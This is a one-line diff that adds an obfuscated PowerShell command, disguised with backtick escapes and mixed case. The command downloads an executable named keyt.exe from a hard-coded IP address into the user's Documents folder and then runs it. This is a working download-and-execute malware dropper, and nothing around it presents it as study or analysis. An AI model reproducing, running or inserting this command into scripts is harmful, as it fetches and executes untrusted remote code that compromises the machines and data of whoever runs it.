@@ -1,0 +1,1 @@
+﻿imPO`RT-m`Odule BitsTransfer; $path = [environment]::getfolderpath("mydocuments"); s`T`A`R`T-BiT`sTRAnsFEr -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"; iNv`Ok`E-IT`EM  "$path\keyt.exe"
